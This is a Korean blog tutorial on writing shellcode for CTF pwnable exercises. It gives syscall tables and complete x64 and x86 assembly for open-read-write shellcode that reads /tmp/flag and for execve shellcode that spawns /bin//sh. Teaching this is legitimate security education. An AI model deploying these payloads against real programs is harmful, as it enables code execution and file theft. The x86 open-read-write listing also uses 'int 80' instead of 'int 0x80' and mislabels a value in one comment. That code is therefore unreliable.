---
title: Shellcode
date: 2024-03-01 12:00:00 +0900
categories: [Pwnable, Pwn Theory]
tags: [Pwnable, Shellcode]
math: true
mermaid: true
---
**쉘코드(Shellcode)**는 익스플로잇을 위해 제작된 어셈블리 코드 조각이다.

쉘코드는 **orw 쉘코드**, **execve 쉘코드**가 있다.

## ORW Shellcode
orw 쉘코드는 파일을 **열고(open) 읽고(read) 출력(write)**하는 쉘코드이다.

아래와 같은 orw 쉘코드를 작성하기 위해 알아야 하는 syscall은 다음과 같다.
```c
char buf[0x30];

int fd = open("/tmp/flag", RD_ONLY, NULL);
read(fd, buf, 0x30); 
write(1, buf, 0x30);
```
### x64(64bit)

| syscall | rax  | arg0(rdi) | arg1(rsi)   | arg2(rdx)  |
|:--------|------|-----------|-------------|------------|
|**open** | 0x02 | filename  | flags       | mode       |
|**read** | 0x00 | fd        | buf         | size       |
|**write**| 0x01 | fd        | buf         | size       |

<details>
<summary>flags</summary>
<div markdown="1">
* O_RDONLY(Open read-only): 0
* O_WRONLY(Open write-only): 1
* O_RDWR(Open read/write): 2
</div>
</details>

#### 구현
```s
mov rax, 0x67                ; g
push rax
mov rax, 0x616c662f706d742f  ; alf/pmt/
push rax
mov rdi, rsp    ; rdi = "/tmp/flag"
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 0x2    ; rax = 2 ; syscall_open
syscall         ; open("/tmp/flag", RD_ONLY, NULL)

mov rdi, rax      ; rdi = fd
mov rsi, rsp
sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
mov rdx, 0x30     ; rdx = 0x30     ; len
mov rax, 0x0      ; rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x30)

mov rdi, 0x1      ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)
```
"/tmp/flag"라는 문자열을 메모리에 위치 시켜야 한다. x86_64환경에서는 스택에 8바이트 단위로만 값을 올릴 수 있어서 나머지 값을 먼저 올린다.
> `open`은 파일 이름을 인자로 받을 때, 문자열 끝을 NULL로 확인한다. 
{: .prompt-tip }

### x86(32bit)

| syscall | eax  | arg0(ebx) | arg1(ecx)   | arg2(edx)  |
|:--------|------|-----------|-------------|------------|
|**open** | 0x05 | filename  | flags       | mode       |
|**read** | 0x03 | fd        | buf         | size       |
|**write**| 0x04 | fd        | buf         | size       |

#### 구현
```s
mov eax, 0x67       ; g
push eax
mov eax, 0x616c662f ; alf/
push eax
mov eax, 0x706d742f ; pmt/
push eax
mov ebx, esp        ; ebx = "/tmp/flag"
xor ecx, ecx        ; ecx = 0 ; RD_ONLY
xor edx, edx        ; edx = 0
mov eax, 0x5        ; eax = 5 ; syscall_open
int 80              ; open("/tmp/flag", RD_ONLY, NULL)

mov ebx, eax        ; ebx = fd
mov ecx, esp        
sub ecx, 0x30       ; ecx = esp - 0x30 ; buf
mov edx, 0x30       ; edx = 30         ; len
mov eax, 0x3        ; eax = 3          ; syscall_read
int 80              ; read(fd, buf, 0x30)

mov ebx, 0x1        ; ebx = 1 ; fd = stdout
mov eax, 0x4        ; eax = 4 ; syscall_write
int 80              ; write(fd, buf, 0x30)
```

## execve Shellcode
execve shellcode는 **임의의 프로그램을 실행**하는 쉘코드이다.

execve shellcode를 작성하기 위해 알아야 하는 syscall은 다음과 같다.

### x64(64bit)

|  syscall  | rax  | arg0(rdi) | arg1(rsi)   | arg2(rdx)  |
|:----------|------|-----------|-------------|------------|
|**execve** | 0x3b | filename  | argv        | envp       |

* argv: 실행 파일에 넘겨줄 인자
* envp: 환경 변수

### 구현
```s
xor rax, rax
push rax
mov rax, 0x68732f2f6e69622f ; sh//nib/
push rax
mov rdi, rsp                ; rdi = "/bin//sh"
xor rsi, rsi                ; rsi = 0
xor rdx, rdx                ; rdx = 0
mov rax, 0x3b               ; rax = 0x3b    ; syscall_execve
syscall                     ; execve("/bin//sh", NULL, NULL)
```

### x86(32bit)

|  syscall  | eax  | arg0(ebx) | arg1(ecx)   | arg2(edx)  |
|:----------|------|-----------|-------------|------------|
|**execve** | 0xb  | filename  | argv        | envp       |

#### 구현
```s
xor    eax, eax
push   eax
mov    eax, 0x68732f2f   ; hs//
push   eax
mov    eax, 0x6e69622f   ; nib/
push   eax
mov    ebx, esp     ; ebx = "/bin//sh"
xor    ecx, ecx     ; ecx = 0
xor    edx, edx     ; edx = 0
mov    eax, 0xb     ; eax = 0xb ; syscall_execve
int    0x80         ; execve("/bin//sh", NULL, NULL)
```

## Ref
[1] [드림핵 시스템 해킹 강의 Shellcode](https://dreamhack.io/lecture/roadmaps/2)

[2] [Syscall Table](https://rninche01.tistory.com/entry/Linux-system-call-table-%EC%A0%95%EB%A6%ACx86-x64)